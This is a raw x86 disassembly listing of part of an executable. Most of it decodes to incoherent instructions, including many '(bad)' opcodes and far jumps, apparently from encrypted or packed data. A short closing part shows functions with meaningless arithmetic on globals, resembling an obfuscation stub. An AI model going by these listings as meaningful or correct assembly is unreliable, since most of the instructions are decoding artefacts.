  40fb03:	mov    esi,0x2275f2cb
  40fb08:	pop    esi
  40fb09:	std    
  40fb0a:	jbe    0x40fabb
  40fb0c:	xchg   ecx,edi
  40fb0e:	xor    esp,eax
  40fb10:	lods   eax,DWORD PTR ds:[esi]
  40fb11:	lea    esp,[eax]
  40fb13:	sar    BYTE PTR [eax],1
  40fb15:	xor    BYTE PTR [ecx+0x75e8ff91],bl
  40fb1b:	jle    0x40fb78
  40fb1d:	call   0x8991fd80
  40fb22:	test   eax,0x6344463b
  40fb27:	shr    BYTE PTR [ebx],1
  40fb29:	mov    ebp,0xe5c74bb7
  40fb2e:	sbb    BYTE PTR [esi],ch
  40fb30:	jl     0x40facc
  40fb32:	nop
  40fb33:	push   esp
  40fb34:	out    dx,eax
  40fb35:	mov    ds:0x565cc45f,eax
  40fb3a:	xlat   BYTE PTR ds:[ebx]
  40fb3b:	pop    esi
  40fb3c:	loop   0x40fb68
  40fb3e:	mov    ebx,ss
  40fb40:	ficomp DWORD PTR [edx]
  40fb42:	pop    ds
  40fb43:	dec    esp
  40fb44:	xor    eax,0xb1a53365
  40fb49:	jns    0x40fae3
  40fb4b:	mov    bh,0xe7
  40fb4d:	inc    ebx
  40fb4e:	shl    DWORD PTR [ebx],1
  40fb50:	dec    ebx
  40fb51:	xchg   esi,eax
  40fb52:	xchg   BYTE PTR [ebx-0x4c8487c2],ch
  40fb58:	push   ebx
  40fb59:	pushf  
  40fb5a:	add    DWORD PTR [ebp-0x62acf17e],0xffffffca
  40fb61:	inc    esp
  40fb62:	aad    0xa4
  40fb64:	fs add dl,ah
  40fb67:	pop    es
  40fb68:	jp     0x40fb3f
  40fb6a:	(bad)  
  40fb6b:	call   FWORD PTR [edx-0x623b5c12]
  40fb71:	and    BYTE PTR [ebx-0x778de913],ch
  40fb77:	mov    ?,WORD PTR [ebp+0x6]
  40fb7a:	adc    BYTE PTR [edi+0x5e0d7e9c],cl
  40fb80:	dec    esp
  40fb81:	andps  xmm2,XMMWORD PTR [ecx]
  40fb84:	dec    esp
  40fb85:	inc    ebx
  40fb86:	std    
  40fb87:	ins    BYTE PTR es:[edi],dx
  40fb88:	scas   al,BYTE PTR es:[edi]
  40fb89:	in     al,dx
  40fb8a:	jmp    0x40fc03
  40fb8c:	push   ds
  40fb8d:	sub    esp,DWORD PTR ds:0xf7c33f93
  40fb93:	jmp    DWORD PTR [esi-0x5c368d52]
  40fb99:	int3   
  40fb9a:	mov    ecx,0x4b586372
  40fb9f:	inc    esi
  40fba0:	fimul  DWORD PTR [edx]
  40fba2:	jbe    0x40f521
  40fba8:	pop    ebx
  40fba9:	mov    eax,0xf89c8532
  40fbae:	pop    edi
  40fbaf:	pop    esi
  40fbb0:	leave  
  40fbb1:	ret    0xc
  40fbb4:	push   ebp
  40fbb5:	mov    ebp,esp
  40fbb7:	jmp    0x40fed6
  40fbbc:	shl    DWORD PTR [esi-0x168e14bc],cl
  40fbc2:	jno    0x40fb6a
  40fbc4:	aad    0xf
  40fbc6:	xor    ebx,0xffffffa7
  40fbc9:	sbb    bh,bh
  40fbcb:	jg     0x40fb9d
  40fbcd:	mov    dh,0x7e
  40fbcf:	jle    0x40fc4d
  40fbd1:	jge    0x40fc51
  40fbd3:	jle    0x40fbcf
  40fbd5:	xor    eax,DWORD PTR [ecx+0x18]
  40fbd8:	popa   
  40fbd9:	pop    edx
  40fbda:	jle    0x40fc46
  40fbdc:	je     0x40fbc1
  40fbde:	mov    bl,0xa0
  40fbe0:	xchg   esp,eax
  40fbe1:	es inc esi
  40fbe3:	dec    eax
  40fbe4:	je     0x40fc35
  40fbe6:	fs pop ecx
  40fbe8:	ja     0x40fc5a
  40fbea:	adc    al,BYTE PTR [ebx]
  40fbec:	mov    ch,0xf4
  40fbee:	sbb    eax,0xd885651e
  40fbf3:	outs   dx,BYTE PTR ds:[esi]
  40fbf4:	mov    ch,0xc
  40fbf6:	jp     0x40fc2d
  40fbf8:	imul   edi,DWORD PTR [esi+ecx*1],0x58
  40fbfc:	push   ebp
  40fbfd:	iret   
  40fbfe:	jns    0x40fc10
  40fc00:	inc    esi
  40fc01:	cmp    al,0x77
  40fc03:	or     ecx,DWORD PTR ds:0x8f01bf1c
  40fc09:	lods   al,BYTE PTR ds:[esi]
  40fc0a:	add    eax,0x8793851a
  40fc0f:	jb     0x40fbaa
  40fc11:	daa    
  40fc12:	fnstcw WORD PTR [edx]
  40fc14:	std    
  40fc15:	fs aaa 
  40fc17:	int3   
  40fc18:	or     eax,0xd646a2b1
  40fc1d:	jle    0x40fbf3
  40fc1f:	jns    0x40fc78
  40fc21:	xlat   BYTE PTR ds:[ebx]
  40fc22:	mov    esi,0x9d9a8984
  40fc27:	mov    al,0x3e
  40fc29:	lahf   
  40fc2a:	mov    dh,0x45
  40fc2c:	cs xchg esp,eax
  40fc2e:	aam    0x18
  40fc30:	adc    DWORD PTR [edx+0x4f],edx
  40fc33:	dec    edi
  40fc34:	xchg   edi,eax
  40fc35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fc36:	pop    ecx
  40fc37:	retf   0xf34d
  40fc3a:	inc    esi
  40fc3b:	add    bh,ch
  40fc3d:	jmp    0x4f4a73fe
  40fc42:	mov    dl,0x77
  40fc44:	(bad)  
  40fc45:	jmp    0x2ca3:0xdf2a8785
  40fc4c:	adc    DWORD PTR [esi],eax
  40fc4e:	int    0xb9
  40fc50:	(bad)  
  40fc52:	cmc    
  40fc53:	pop    esi
  40fc54:	stc    
  40fc55:	in     al,dx
  40fc56:	neg    BYTE PTR [ebp+eiz*1-0x22]
  40fc5a:	jns    0x40fca4
  40fc5c:	sbb    cl,BYTE PTR [eax+esi*8-0x66]
  40fc60:	sbb    ch,BYTE PTR [ebx+0x4cda314e]
  40fc66:	adc    dl,BYTE PTR [esi]
  40fc68:	jmp    0x8723:0x52d48647
  40fc6f:	cdq    
  40fc70:	addr16 mov edi,es
  40fc73:	(bad)  
  40fc75:	sub    BYTE PTR [edi],cl
  40fc77:	mov    edx,0x819c06bf
  40fc7c:	or     ecx,DWORD PTR [ecx-0x6d]
  40fc7f:	shl    DWORD PTR [edx],cl
  40fc81:	pop    edx
  40fc82:	retf   
  40fc83:	addr16 cs (bad) 
  40fc86:	xor    al,0x3e
  40fc88:	jecxz  0x40fc74
  40fc8a:	das    
  40fc8b:	pop    edi
  40fc8c:	int3   
  40fc8d:	mov    ds:0x53b9b299,eax
  40fc92:	out    dx,al
  40fc93:	dec    eax
  40fc94:	jne    0x40fce3
  40fc96:	in     eax,dx
  40fc97:	in     al,0xa3
  40fc99:	loop   0x40fc31
  40fc9b:	push   cs
  40fc9c:	mov    ?,WORD PTR [edi+edi*1]
  40fc9f:	cmp    DWORD PTR [edx],esi
  40fca1:	addr16 mov ds:0x7704,eax
  40fca5:	jb     0x40fc69
  40fca7:	mov    ds:0xba9d69cf,eax
  40fcac:	push   esp
  40fcad:	es xchg ebp,ecx
  40fcb0:	sbb    ebp,esi
  40fcb2:	pushf  
  40fcb3:	mov    ch,0x19
  40fcb5:	sbb    BYTE PTR [esi-0x9c5c287],bh
  40fcbb:	sub    eax,0x2d7b8dc1
  40fcc0:	inc    ebp
  40fcc1:	or     al,0x96
  40fcc3:	sub    al,0xe2
  40fcc5:	dec    ebp
  40fcc6:	test   al,0xda
  40fcc8:	repz test DWORD PTR [ecx],0x3561cf1
  40fccf:	je     0x40fd43
  40fcd1:	shl    DWORD PTR [ebp+0x72c4e75d],cl
  40fcd7:	mov    dl,0x75
  40fcd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fcda:	mov    ecx,0xbb5cce6e
  40fcdf:	jmp    0x40fd57
  40fce1:	enter  0xd75,0x6c
  40fce5:	test   al,0xd6
  40fce7:	and    eax,DWORD PTR [ecx]
  40fce9:	mov    dh,0xe2
  40fceb:	dec    edx
  40fcec:	add    al,0x16
  40fcef:	repnz fild QWORD PTR [edx+edi*4]
  40fcf3:	push   ecx
  40fcf4:	mov    edi,0x3c928a04
  40fcf9:	add    DWORD PTR [edi+0x78014b0a],esi
  40fcff:	dec    ebx
  40fd00:	pop    ecx
  40fd01:	cmc    
  40fd02:	ficom  WORD PTR [eax]
  40fd04:	xor    dl,BYTE PTR [ecx+0x4d]
  40fd07:	jb     0x40fd09
  40fd09:	sub    bl,0x17
  40fd0c:	mov    al,ds:0x286da40a
  40fd11:	dec    ebx
  40fd12:	(bad)  
  40fd13:	adc    eax,0xd1de2bfb
  40fd18:	cmp    bh,BYTE PTR [esi+0x44eb0a2]
  40fd1e:	lock lds esp,FWORD PTR [ebx-0x7b]
  40fd22:	adc    ebx,edx
  40fd24:	sbb    BYTE PTR [esi+0x73155dbb],ch
  40fd2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd2b:	jl     0x40fcd2
  40fd2d:	fs xchg edx,eax
  40fd2f:	fdivr  DWORD PTR [esi+ebx*2]
  40fd32:	lahf   
  40fd33:	and    ah,ah
  40fd35:	cmp    DWORD PTR [ecx+0x284e7d4b],eax
  40fd3b:	int    0x77
  40fd3d:	mov    edi,0x86fa01ee
  40fd42:	cdq    
  40fd43:	out    dx,al
  40fd44:	adc    al,0x9f
  40fd46:	test   al,0x1e
  40fd48:	int    0x2b
  40fd4a:	and    ch,0x60
  40fd4d:	mov    eax,ds:0x930de3e0
  40fd52:	fwait
  40fd53:	call   0x9014:0xd97256a3
  40fd5a:	or     al,BYTE PTR [edx]
  40fd5c:	out    0x17,eax
  40fd5e:	bound  eax,QWORD PTR [ebx-0x55a8f05c]
  40fd64:	and    dh,BYTE PTR [eax+ebx*1]
  40fd67:	dec    edi
  40fd68:	(bad)  
  40fd69:	fnstsw WORD PTR [ebp+0x7f7d2c0a]
  40fd6f:	dec    esi
  40fd70:	test   DWORD PTR [ebp-0x38c4a744],eax
  40fd76:	cwde   
  40fd77:	mov    bh,0xce
  40fd79:	imul   bl
  40fd7b:	pop    ss
  40fd7c:	(bad)  
  40fd7d:	lea    esi,[edx]
  40fd7f:	scas   eax,DWORD PTR es:[edi]
  40fd80:	out    0xaa,eax
  40fd82:	inc    eax
  40fd83:	dec    esp
  40fd84:	add    esp,DWORD PTR [eax]
  40fd86:	or     eax,0x33457e15
  40fd8b:	iret   
  40fd8c:	data16 (bad) [ecx+0x3d]
  40fd90:	sbb    DWORD PTR [esi+0x23],ebx
  40fd93:	sbb    eax,0x35b6cebf
  40fd98:	ficom  DWORD PTR [edi+0x1a]
  40fd9b:	test   eax,0x6b7ad847
  40fda0:	sbb    BYTE PTR [edx],dl
  40fda2:	in     al,0xec
  40fda4:	pop    esi
  40fda5:	popf   
  40fda6:	inc    eax
  40fda7:	lods   al,BYTE PTR ds:[esi]
  40fda8:	mov    ss,WORD PTR [eax-0x2c9bd50]
  40fdae:	jno    0x40fdea
  40fdb0:	mov    dh,0x79
  40fdb2:	sar    BYTE PTR [edi+0x30],0xe7
  40fdb6:	pop    esp
  40fdb7:	aad    0x6
  40fdb9:	dec    esi
  40fdba:	push   esp
  40fdbb:	(bad)  
  40fdbc:	mov    bh,BYTE PTR [ebx]
  40fdbe:	pop    ecx
  40fdbf:	sub    edx,DWORD PTR [edx+eax*2]
  40fdc2:	push   eax
  40fdc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fdc4:	sbb    al,BYTE PTR [ebp-0x4]
  40fdc7:	mov    ds,WORD PTR [ebp-0x195bff06]
  40fdcd:	mov    DWORD PTR [ebx],esp
  40fdcf:	(bad)  
  40fdd0:	int    0xd3
  40fdd2:	adc    eax,0xc7b08c64
  40fdd7:	dec    esi
  40fdd8:	(bad)  
  40fdd9:	fmulp  st(5),st
  40fddb:	in     eax,dx
  40fddc:	pop    ebx
  40fddd:	push   0x47
  40fddf:	mov    al,gs:0x1cacb318
  40fde5:	je     0x40fe61
  40fde7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fde8:	sbb    DWORD PTR [esi+ebx*8+0x59],edi
  40fdec:	(bad)  ss:[esi]
  40fdef:	xor    eax,0xae9d93d0
  40fdf4:	mov    dl,0x41
  40fdf6:	xchg   edx,eax
  40fdf7:	jmp    0x19a4:0x6d29fe23
  40fdfe:	mov    bl,0x42
  40fe00:	mov    dl,0xfd
  40fe02:	popf   
  40fe03:	test   DWORD PTR [edi-0x1d],edx
  40fe06:	jb     0x40fdb6
  40fe08:	and    dh,BYTE PTR [eax+0x32]
  40fe0b:	sub    ecx,esp
  40fe0d:	or     edx,ebp
  40fe0f:	rcr    BYTE PTR [esi+0x4afb9872],1
  40fe15:	loopne 0x40fe23
  40fe17:	jnp    0x40fe54
  40fe19:	mov    ebp,0x1971f23f
  40fe1e:	cs mov dl,0x1d
  40fe21:	(bad)  
  40fe22:	out    0xb3,eax
  40fe24:	out    dx,eax
  40fe25:	add    DWORD PTR [edx],eax
  40fe27:	pop    ebx
  40fe28:	jecxz  0x40fe14
  40fe2a:	or     eax,0xd8f9b304
  40fe2f:	sahf   
  40fe30:	mov    edi,0xa49f25f
  40fe35:	inc    ebx
  40fe36:	lahf   
  40fe37:	ret    
  40fe38:	dec    ecx
  40fe39:	arpl   WORD PTR [esi-0x52e69199],bx
  40fe3f:	mov    al,ds:0x4285fe97
  40fe44:	jae    0x40fdf5
  40fe46:	pop    ds
  40fe47:	pop    ecx
  40fe48:	mov    bh,bl
  40fe4a:	out    dx,eax
  40fe4b:	cld    
  40fe4c:	add    ebp,eax
  40fe4e:	int3   
  40fe4f:	shr    DWORD PTR [ebp-0x4d2cee70],cl
  40fe55:	int3   
  40fe56:	mov    ds:0x95f659ba,eax
  40fe5b:	addr16 ret 0x47a2
  40fe5f:	adc    eax,0xbf09f332
  40fe64:	lea    esi,[esi]
  40fe66:	dec    esi
  40fe67:	stc    
  40fe68:	(bad)  [esi+0x70]
  40fe6b:	add    ebp,ebx
  40fe6d:	rcl    BYTE PTR [eax*2+0x43597278],0x62
  40fe75:	fisubr DWORD PTR [ebx-0xd]
  40fe78:	sub    DWORD PTR ds:0x655e4789,0x70bd7375
  40fe82:	mov    ebp,DWORD PTR [esp+eax*4+0x93f94ad]
  40fe89:	pop    esi
  40fe8a:	cmp    BYTE PTR [esi],ch
  40fe8c:	dec    edx
  40fe8d:	add    eax,0x5227b80e
  40fe92:	shr    ah,1
  40fe94:	popa   
  40fe95:	mov    ds:0x2420d5ec,eax
  40fe9a:	and    edx,0xf3672193
  40fea0:	push   0xffffffa9
  40fea2:	jno    0x40fe57
  40fea4:	imul   ecx,edi,0x6ea48272
  40feaa:	or     ebx,DWORD PTR [edi+0x40d40dbf]
  40feb0:	cmp    eax,0xd318c8dd
  40feb5:	xor    eax,0xf21b312
  40feba:	pop    ecx
  40febb:	jg     0x40fe68
  40febd:	js     0x40feee
  40febf:	cmp    eax,0x7352bb34
  40fec4:	pop    ebx
  40fec5:	imul   esi,DWORD PTR [ebx-0x2],0x3f1fa534
  40fecc:	cmp    eax,0x557a8f74
  40fed1:	gs pop ds
  40fed3:	fild   QWORD PTR [edx+ecx*1+0x330c458b]
  40feda:	sar    BYTE PTR [ecx+0x7264fca9],cl
  40fee0:	jmp    0x4101ff
  40fee5:	or     eax,0xf19cc125
  40feea:	pop    eax
  40feeb:	jno    0x40fea2
  40feed:	xchg   ecx,eax
  40feee:	add    eax,0x4d94346
  40fef3:	xchg   esi,eax
  40fef4:	sbb    ebx,esi
  40fef6:	mov    ch,0x7e
  40fef8:	jle    0x40ff76
  40fefa:	jge    0x40ff7a
  40fefc:	jle    0x40fe9b
  40fefe:	push   ss
  40feff:	xlat   BYTE PTR ds:[ebx]
  40ff00:	test   eax,0x46a9333b
  40ff05:	mov    dh,0xdc
  40ff07:	adc    BYTE PTR [ebx+0x64],dh
  40ff0a:	adc    al,0xec
  40ff0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ff0d:	test   al,0xec
  40ff0f:	mov    WORD PTR [ecx-0x746e24d1],es
  40ff15:	dec    edi
  40ff16:	mov    ds:0xcbe5f1fb,al
  40ff1b:	bound  esp,QWORD PTR [edx]
  40ff1d:	bound  ebx,QWORD PTR [ebx-0x51]
  40ff20:	mov    ebx,0x30f9c8b1
  40ff25:	rol    BYTE PTR [esi+0x6f],cl
  40ff28:	sub    ch,BYTE PTR [esi-0x248590b6]
  40ff2e:	mov    BYTE PTR [esp+eiz*2-0x7a],bl
  40ff32:	mov    gs,WORD PTR [ebx]
  40ff34:	sbb    ebp,DWORD PTR [esi]
  40ff36:	cs pop esp
  40ff38:	jl     0x40ff3c
  40ff3a:	in     eax,dx
  40ff3b:	adc    edi,DWORD PTR [eax+0x34]
  40ff3e:	dec    esp
  40ff3f:	out    0x7e,eax
  40ff41:	sbb    eax,0x28dad7af
  40ff46:	mov    ch,0x8a
  40ff48:	xchg   BYTE PTR [eax],dl
  40ff4a:	out    0xe1,eax
  40ff4c:	add    dh,BYTE PTR [esi+0x7f77d769]
  40ff52:	rol    DWORD PTR [ebp-0x382ee121],1
  40ff58:	inc    esp
  40ff59:	mov    ds,WORD PTR [esp+eax*8-0x5b182d1e]
  40ff60:	mov    eax,ds:0xea548c80
  40ff65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ff66:	fdiv   QWORD PTR [edi-0x73]
  40ff69:	in     al,dx
  40ff6a:	dec    eax
  40ff6b:	cmp    bh,BYTE PTR [esi]
  40ff6d:	ret    
  40ff6e:	mov    dh,0xc4
  40ff70:	and    eax,DWORD PTR [eax]
  40ff72:	sub    al,0xf2
  40ff74:	dec    esp
  40ff75:	lods   al,BYTE PTR ds:[esi]
  40ff76:	cmp    al,0x39
  40ff78:	fstp   TBYTE PTR [edx]
  40ff7a:	sbb    ebp,0xdc07130b
  40ff80:	faddp  st(2),st
  40ff82:	inc    edx
  40ff83:	sbb    al,0x8a
  40ff85:	mov    dh,0xc4
  40ff87:	(bad)  
  40ff88:	(bad)  
  40ff89:	test   ebx,0xf445e58f
  40ff8f:	add    ecx,DWORD PTR [ecx]
  40ff91:	and    BYTE PTR [ebx],0x3f
  40ff94:	xchg   edx,eax
  40ff95:	push   es
  40ff96:	mov    eax,ds:0x6c993f6e
  40ff9b:	je     0x40ff6a
  40ff9d:	adc    al,0x9
  40ff9f:	dec    esp
  40ffa0:	xchg   ecx,eax
  40ffa1:	inc    ebp
  40ffa2:	fidivr WORD PTR [eax]
  40ffa4:	cmp    cl,dh
  40ffa6:	add    ah,cl
  40ffa8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ffa9:	test   al,0xc6
  40ffab:	loopne 0x40ff77
  40ffad:	test   BYTE PTR [edx-0x51531ef9],ah
  40ffb3:	push   ds
  40ffb4:	cmc    
  40ffb5:	mov    edx,0x36846db9
  40ffba:	pop    esi
  40ffbb:	push   eax
  40ffbc:	fucomp st(6)
  40ffbe:	dec    esi
  40ffbf:	inc    eax
  40ffc0:	xchg   BYTE PTR [ecx+edx*2-0x6c],ah
  40ffc4:	ins    BYTE PTR es:[edi],dx
  40ffc5:	dec    edx
  40ffc6:	sub    al,BYTE PTR [edi+0xd]
  40ffc9:	xor    eax,0xf0e38325
  40ffce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ffcf:	mov    eax,ds:0x2edfbde1
  40ffd4:	inc    ebx
  40ffd5:	leave  
  40ffd6:	mov    bl,0x10
  40ffd8:	xchg   edi,eax
  40ffd9:	adc    edx,DWORD PTR ds:0xcfff6914
  40ffdf:	fidiv  DWORD PTR [eax+0x465c3d79]
  40ffe5:	ja     0x41004a
  40ffe7:	cmp    edx,0x1499a15
  40ffed:	das    
  40ffee:	(bad)  
  40ffef:	mov    ecx,0x269dcef5
  40fff4:	sbb    dh,bl
  40fff6:	jg     0x41001c
  40fff8:	add    DWORD PTR [edi],ecx
  40fffa:	mov    esi,0x97b2b0cb
  40ffff:	jmp    0x85a7:0xf64a872b
  410006:	fidivr DWORD PTR [ecx+esi*1]
  410009:	pusha  
  41000a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41000b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41000c:	mov    ah,0xcc
  41000e:	pop    eax
  41000f:	inc    edx
  410010:	jl     0x410052
  410012:	je     0x410029
  410014:	cmp    DWORD PTR [edi-0x77],esp
  410017:	das    
  410018:	push   eax
  410019:	scas   al,BYTE PTR es:[edi]
  41001a:	cld    
  41001b:	pop    esi
  41001c:	fcmovnb st,st(2)
  41001e:	call   0x6ae1b44f
  410023:	xor    DWORD PTR [ebx],0x7a
  410026:	scas   al,BYTE PTR es:[edi]
  410027:	add    eax,DWORD PTR [ebx+0x7e211ca4]
  41002d:	nop
  41002e:	pushw  cs
  410030:	int3   
  410031:	push   ds
  410032:	test   DWORD PTR [eax],eax
  410034:	ror    ebp,1
  410036:	(bad)  
  410037:	fldcw  WORD PTR [ebx]
  410039:	xchg   ebp,eax
  41003a:	mov    cl,0x95
  41003c:	clc    
  41003d:	sub    DWORD PTR [ebp-0x6985543e],edi
  410043:	ror    DWORD PTR [edi+0x6fbb6c34],cl
  410049:	outs   dx,DWORD PTR ds:[esi]
  41004a:	les    ecx,FWORD PTR [esi-0x63]
  41004d:	push   edi
  41004e:	ret    0xf015
  410051:	arpl   WORD PTR [eax],bp
  410053:	in     eax,0x36
  410055:	int    0xce
  410057:	adc    ecx,edi
  410059:	mov    ds:0xd14141d6,eax
  41005e:	or     DWORD PTR [ebx],0x16
  410061:	popa   
  410062:	test   BYTE PTR ds:0x94f9320c,0x3e
  410069:	int3   
  41006a:	cdq    
  41006b:	mov    edi,0x66938227
  410070:	int3   
  410071:	lea    edi,[ebp-0x72f4bd07]
  410077:	jns    0x4100a5
  410079:	mov    BYTE PTR [edx-0x64f32c53],cl
  41007f:	in     al,dx
  410080:	in     al,dx
  410081:	in     al,0xa
  410083:	iret   
  410084:	in     eax,0xb5
  410086:	test   BYTE PTR [ecx-0x9c6dc0],cl
  41008c:	push   edx
  41008d:	out    dx,eax
  41008e:	test   BYTE PTR es:[ecx-0x115d7ac4],ch
  410095:	sahf   
  410096:	xor    BYTE PTR [ecx+0x1],ah
  410099:	mov    bl,al
  41009b:	jle    0x410036
  41009d:	stos   DWORD PTR es:[edi],eax
  41009e:	cmp    al,0x4f
  4100a0:	stos   BYTE PTR es:[edi],al
  4100a1:	jne    0x410075
  4100a3:	or     DWORD PTR [edi-0x60],edx
  4100a6:	mov    edi,0x8b512099
  4100ab:	dec    esp
  4100ac:	fnstcw WORD PTR [esi-0x64]
  4100af:	push   es
  4100b0:	and    al,0x58
  4100b2:	das    
  4100b3:	rcr    BYTE PTR [ecx],1
  4100b5:	cmp    al,0x43
  4100b7:	sub    BYTE PTR [esi],0x11
  4100ba:	int    0xea
  4100bc:	sbb    DWORD PTR [ebx-0x4426f0fd],0xffffffc5
  4100c3:	ins    DWORD PTR es:[edi],dx
  4100c4:	ss enter 0x94be,0x77
  4100c9:	jp     0x4100a2
  4100cb:	push   edx
  4100cc:	lock push ss
  4100ce:	xchg   ebx,eax
  4100cf:	dec    edi
  4100d0:	lea    esi,[edi]
  4100d2:	mov    bl,0xbc
  4100d4:	and    eax,0xdd2fd3cc
  4100d9:	call   0x47b1:0xf0d6dfc6
  4100e0:	call   0x535edb3e
  4100e5:	std    
  4100e6:	fisttp WORD PTR [ecx-0x8327f15]
  4100ec:	mov    cl,0x9d
  4100ee:	mov    ds:0x7c90f1c1,al
  4100f3:	or     ecx,DWORD PTR [eax]
  4100f5:	adc    eax,0x723fbf4a
  4100fa:	dec    edi
  4100fb:	shl    BYTE PTR [edi],cl
  4100fd:	mov    ah,0x92
  4100ff:	dec    esi
  410100:	cli    
  410101:	jp     0x410166
  410103:	int3   
  410104:	(bad)  
  410105:	int    0x4c
  410107:	inc    ecx
  410108:	push   esi
  410109:	jnp    0x4100b6
  41010b:	xor    BYTE PTR [ebx+esi*1],0x57
  41010f:	xor    al,0x43
  410111:	mov    bl,0xd1
  410113:	xrstors [eax-0x52]
  410117:	jne    0x4100a6
  410119:	loopne 0x410150
  41011b:	add    eax,0xd0ebec9f
  410120:	cmp    eax,eax
  410122:	mov    al,ds:0x3ad15003
  410127:	mov    ds:0xd68698f2,al
  41012c:	out    dx,eax
  41012d:	imul   eax,DWORD PTR [edx+0x4c],0x332c71fc
  410134:	xor    ah,BYTE PTR ds:0x14d312d2
  41013a:	cdq    
  41013b:	xchg   dh,bl
  41013d:	stos   DWORD PTR es:[edi],eax
  41013e:	sub    edi,esi
  410140:	sub    eax,0xfb651a7c
  410145:	pop    ebp
  410146:	lahf   
  410147:	mov    bl,0xa1
  410149:	imul   esi,DWORD PTR [edi],0x9
  41014c:	test   DWORD PTR [ebp-0x6884e5c4],eax
  410152:	es ja  0x41016d
  410155:	dec    esi
  410156:	daa    
  410157:	(bad)  
  410158:	add    al,0xf
  41015a:	(bad)  
  41015c:	pusha  
  41015d:	mov    ds:0x3ee8f929,eax
  410162:	push   eax
  410163:	addr16 push esp
  410165:	neg    eax
  410167:	push   ecx
  410168:	push   ds
  410169:	mov    cl,0x98
  41016b:	popf   
  41016c:	repnz sbb eax,edx
  41016f:	jp     0x410191
  410171:	and    BYTE PTR [ebx+edx*2-0x2385e824],ah
  410178:	xchg   DWORD PTR [ebx+0x4d],ebx
  41017b:	outs   dx,DWORD PTR ds:[esi]
  41017c:	cwde   
  41017d:	dec    edi
  41017e:	pop    ecx
  41017f:	sbb    al,ch
  410181:	adc    cl,dl
  410183:	sub    esi,DWORD PTR [ecx-0xba1dde1]
  410189:	jns    0x410191
  41018b:	repnz inc ecx
  41018d:	fisttp WORD PTR [eax+0x795e9e65]
  410193:	imul   eax
  410195:	out    0xe1,eax
  410197:	cmp    BYTE PTR [esp+ebp*4-0x3968845d],bl
  41019e:	out    0x81,eax
  4101a0:	and    al,ch
  4101a2:	sti    
  4101a3:	nop
  4101a4:	pop    edx
  4101a5:	repnz int 0xf8
  4101a8:	pop    ds
  4101a9:	mov    dl,BYTE PTR [edi+ebp*8]
  4101ac:	(bad)  [esi]
  4101ae:	add    ecx,DWORD PTR [ecx+0x66aa8998]
  4101b4:	dec    ebx
  4101b5:	xchg   edi,eax
  4101b6:	xchg   ecx,eax
  4101b7:	(bad)  [ecx]
  4101b9:	mov    al,0xf9
  4101bb:	cmp    eax,0xd2ad2b00
  4101c0:	mov    ebx,0x99f53bad
  4101c5:	or     eax,0x482fc0f5
  4101ca:	sbb    BYTE PTR [esi+ebx*2+0x5d],cl
  4101ce:	push   edi
  4101cf:	mov    bh,0xc
  4101d1:	lods   eax,DWORD PTR ds:[esi]
  4101d2:	shl    DWORD PTR [ebx-0x73],0x1a
  4101d6:	and    esi,DWORD PTR [esi-0x72e46f82]
  4101dc:	pop    ebx
  4101dd:	retf   0x8601
  4101e0:	stos   DWORD PTR es:[edi],eax
  4101e1:	adc    DWORD PTR [edx],0x9e753079
  4101e7:	lds    eax,FWORD PTR [ebx+eax*2-0x5]
  4101eb:	sbb    BYTE PTR [edi],0x2f
  4101ee:	xchg   ecx,eax
  4101ef:	(bad)  
  4101f0:	loope  0x410188
  4101f2:	inc    eax
  4101f3:	jecxz  0x41024d
  4101f5:	push   esi
  4101f6:	mov    ds:0xcd1048cc,eax
  4101fb:	retf   
  4101fc:	sbb    al,0x9a
  4101fe:	icebp  
  4101ff:	div    ecx
  410201:	mov    ecx,DWORD PTR [ebp+0x10]
  410204:	and    ecx,eax
  410206:	or     ecx,0x81161d8f
  41020c:	mov    eax,ecx
  41020e:	pop    ebp
  41020f:	ret    0x18
  410212:	push   ebp
  410213:	mov    ebp,esp
  410215:	sub    esp,0x58
  410218:	mov    ecx,DWORD PTR ds:0x43381f
  41021e:	adc    DWORD PTR ds:0x433857,ecx
  410224:	mov    ecx,DWORD PTR [ebp+0x8]
  410227:	and    eax,0x4408
  41022c:	mov    eax,0x8a3c
  410231:	xor    ax,WORD PTR [ecx+0x20]
  410235:	sub    ecx,0x2534
  41023b:	mov    ecx,0x3b02
  410240:	or     DWORD PTR ds:0x43378b,0x3241
  41024a:	add    ax,cx
  41024d:	xor    DWORD PTR ds:0x4338ab,0x1afb
  410257:	movzx  eax,ax
  41025a:	and    ecx,0x4b4d
  410260:	mov    DWORD PTR [ebp-0xc],eax
  410263:	xor    ecx,ecx
  410265:	xor    ecx,DWORD PTR ds:0x43385f
  41026b:	or     DWORD PTR ds:0x433857,ecx
  410271:	mov    BYTE PTR [ebp-0x1],0x7f
  410275:	and    DWORD PTR ds:0x43382b,0x0
  41027f:	jmp    0x410291
  410284:	mov    ecx,DWORD PTR ds:0x43382b
  41028a:	inc    ecx
  41028b:	mov    DWORD PTR ds:0x43382b,ecx
  410291:	cmp    DWORD PTR ds:0x43382b,0x14
  410298:	jae    0x4102ed
  41029e:	cmp    DWORD PTR ds:0x43382b,0xb
  4102a5:	jne    0x4102c6
  4102ab:	push   DWORD PTR [ebp-0x28]
  4102ae:	push   0x4636
  4102b3:	push   0x8d9e
  4102b8:	push   0x8baf
  4102bd:	push   DWORD PTR [ebp-0x18]
  4102c0:	call   DWORD PTR ds:0x412374
  4102c6:	cmp    DWORD PTR ds:0x43382b,0xa
  4102cd:	jne    0x4102e2
  4102d3:	xor    ecx,ecx
  4102d5:	add    ecx,DWORD PTR ds:0x43382b
  4102db:	inc    ecx
  4102dc:	mov    DWORD PTR ds:0x43382b,ecx
  4102e2:	jmp    0x410284
  4102e7:	sbb    ecx,DWORD PTR ds:0x433783
  4102ed:	lea    eax,[ebp-0x1]
  4102f0:	mov    DWORD PTR [ebp-0x10],eax
  4102f3:	mov    al,BYTE PTR [ebp-0x1]
  4102f6:	mov    ecx,DWORD PTR [ebp-0x10]
